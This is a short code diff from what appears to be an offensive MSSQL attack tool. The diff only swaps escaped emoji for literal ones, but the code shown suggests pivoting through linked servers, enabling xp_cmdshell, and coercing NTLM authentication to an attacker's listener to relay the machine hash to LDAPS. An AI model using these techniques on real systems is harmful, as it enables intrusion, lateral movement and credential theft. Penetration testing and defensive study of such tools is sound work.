@@ -534,7 +534,7 @@ EXEC sp_linkedservers;
             if "linked" in result.lower() or "srv_name" in result.lower():
                 logger.info("[+] Linked servers found!")
                 result = (
-                    "\ud83d\udccb LINKED SERVERS FOUND\n"
+                    "📋 LINKED SERVERS FOUND\n"
                     "\u2192 Use mssql_exec_linked to execute queries on linked servers\n"
                     "\u2192 Chain across servers for cross-domain/forest pivoting\n\n" + result
                 )
@@ -598,7 +598,7 @@ EXEC sp_linkedservers;
             if "system_user" in result.lower() or "nt authority" in result.lower():
                 logger.info(f"[+] Successful execution on {linked_server}!")
                 result = (
-                    f"\ud83d\udea8 LINKED SERVER EXECUTION SUCCESSFUL ON {linked_server}!\n"
+                    f"🚨 LINKED SERVER EXECUTION SUCCESSFUL ON {linked_server}!\n"
                     "\u2192 Try enabling xp_cmdshell: sp_configure 'xp_cmdshell', 1\n"
                     "\u2192 Check for further linked servers to chain\n\n" + result
                 )
@@ -657,7 +657,7 @@ EXEC sp_linkedservers;
             result = stdout + "\n" + (stderr or "")
 
             return (
-                f"\ud83d\udccb MSSQL NTLM COERCION ATTEMPTED\n"
+                f"📋 MSSQL NTLM COERCION ATTEMPTED\n"
                 f"\u2192 SQL Server should attempt to authenticate to {listener_ip}\n"
                 "\u2192 Check your Responder/ntlmrelayx for captured auth\n"
                 "\u2192 Machine account hash can be relayed to LDAPS\n\n" + result
